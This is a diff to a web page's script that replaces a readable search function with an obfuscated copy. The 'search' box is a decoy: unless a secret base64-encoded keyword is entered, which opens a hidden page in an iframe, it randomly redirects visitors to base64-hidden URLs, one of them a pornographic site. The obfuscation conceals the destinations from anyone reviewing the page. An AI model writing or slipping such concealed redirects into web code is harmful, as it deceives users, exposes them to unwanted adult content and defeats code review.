@@ -113,65 +113,7 @@
     </div>
 
     <script>
-        const searchInput = document.getElementById('searchInput');
-        const searchBtn = document.getElementById('searchBtn');
-        const iframeContainer = document.getElementById('iframeContainer');
-        const contentFrame = document.getElementById('contentFrame');
-
-        function performSearch() {
-  const searchTerm = searchInput.value.trim();
-
-  if (!searchTerm) {
-    alert('Please enter a search term');
-    return;
-  }
-
-  
-  if (searchTerm.toLowerCase() === atob('dmliZWNvZGVk')) {
-    contentFrame.src = atob('eDRrb25rb3IzLmh0bWw=');
-    iframeContainer.classList.add('active');
-    document.body.classList.add('iframe-mode');
-    return;
-  }
-
-  const r = Math.random();
-
-  if (r < 0.01) {
-
-    window.location.href = atob('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20vdmlkZW8vc2VhcmNoP3NlYXJjaD1zeXNhZG1pbitzZXg=');
-  } else if (r < 0.45) {
-    
-    window.location.href = atob('aHR0cHM6Ly9jb3JuaHViLndlYnNpdGU=');
-  } else {
-    
-    window.location.href = atob('aHR0cHM6Ly9hbmRyZXdodWlzLmdheQo=');
-  }
-}
-
-
-        // Logic to close the iframe when OS sends 'shutdown' message
-        function shutdownOS() {
-            iframeContainer.classList.remove('active');
-            document.body.classList.remove('iframe-mode');
-            contentFrame.src = ''; // Effectively turns off the OS
-            searchInput.value = '';
-        }
-
-        // Event listener for message from iframe
-        window.addEventListener('message', function(event) {
-            // Check if the message is the shutdown command
-            if (event.data === 'shutdown') {
-                shutdownOS();
-            }
-        });
-
-        searchBtn.addEventListener('click', performSearch);
-
-        searchInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                performSearch();
-            }
-        });
+        const _0x2d4318=_0x1e4b;(function(_0x4460ab,_0x72f50a){const _0x584aee=_0x1e4b,_0xfdd190=_0x4460ab();while(!![]){try{const _0x2d65f4=-parseInt(_0x584aee(0x177))/0x1*(parseInt(_0x584aee(0x191))/0x2)+parseInt(_0x584aee(0x179))/0x3+parseInt(_0x584aee(0x17d))/0x4+-parseInt(_0x584aee(0x17f))/0x5+-parseInt(_0x584aee(0x192))/0x6*(parseInt(_0x584aee(0x173))/0x7)+-parseInt(_0x584aee(0x174))/0x8+-parseInt(_0x584aee(0x18c))/0x9*(-parseInt(_0x584aee(0x180))/0xa);if(_0x2d65f4===_0x72f50a)break;else _0xfdd190['push'](_0xfdd190['shift']());}catch(_0x232c9b){_0xfdd190['push'](_0xfdd190['shift']());}}}(_0x39f6,0xeed72));const searchInput=document[_0x2d4318(0x18a)](_0x2d4318(0x175)),searchBtn=document[_0x2d4318(0x18a)](_0x2d4318(0x176)),iframeContainer=document[_0x2d4318(0x18a)](_0x2d4318(0x18f)),contentFrame=document[_0x2d4318(0x18a)](_0x2d4318(0x187));function _0x1e4b(_0x35bd83,_0x1732d6){_0x35bd83=_0x35bd83-0x172;const _0x39f651=_0x39f6();let _0x1e4b71=_0x39f651[_0x35bd83];return _0x1e4b71;}function performSearch(){const _0x438598=_0x2d4318,_0x4bb017=searchInput['value'][_0x438598(0x18e)]();if(!_0x4bb017){alert(_0x438598(0x172));return;}if(_0x4bb017['toLowerCase']()===atob('dmliZWNvZGVk')){contentFrame[_0x438598(0x185)]=atob(_0x438598(0x182)),iframeContainer[_0x438598(0x18b)][_0x438598(0x17c)](_0x438598(0x181)),document[_0x438598(0x17b)][_0x438598(0x18b)][_0x438598(0x17c)](_0x438598(0x194));return;}const _0x19864a=Math[_0x438598(0x178)]();if(_0x19864a<0.01)window[_0x438598(0x189)]['href']=atob('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20vdmlkZW8vc2VhcmNoP3NlYXJjaD1zeXNhZG1pbitzZXg=');else _0x19864a<0.45?window['location'][_0x438598(0x17e)]=atob('aHR0cHM6Ly9jb3JuaHViLndlYnNpdGU='):window[_0x438598(0x189)][_0x438598(0x17e)]=atob('aHR0cHM6Ly9hbmRyZXdodWlzLmdheQo=');}function shutdownOS(){const _0x149cb0=_0x2d4318;iframeContainer[_0x149cb0(0x18b)][_0x149cb0(0x186)]('active'),document[_0x149cb0(0x17b)][_0x149cb0(0x18b)][_0x149cb0(0x186)]('iframe-mode'),contentFrame['src']='',searchInput[_0x149cb0(0x190)]='';}function _0x39f6(){const _0x633755=['eDRrb25rb3IzLmh0bWw=','shutdown','key','src','remove','contentFrame','Enter','location','getElementById','classList','18eloWoz','addEventListener','trim','iframeContainer','value','65422wjtwRe','444qTICyY','keypress','iframe-mode','Please\x20enter\x20a\x20search\x20term','76097zCYvbz','6231216oKnTPr','searchInput','searchBtn','45VzydtX','random','4880748BkWTjm','click','body','add','309968zDGkIZ','href','2849905oKbmOu','14496070qbieEO','active'];_0x39f6=function(){return _0x633755;};return _0x39f6();}window['addEventListener']('message',function(_0x1227cc){const _0x22f6d1=_0x2d4318;_0x1227cc['data']===_0x22f6d1(0x183)&&shutdownOS();}),searchBtn[_0x2d4318(0x18d)](_0x2d4318(0x17a),performSearch),searchInput[_0x2d4318(0x18d)](_0x2d4318(0x193),function(_0x43164e){const _0x3879df=_0x2d4318;_0x43164e[_0x3879df(0x184)]===_0x3879df(0x188)&&performSearch();});
     </script>
 </body>
 </html>
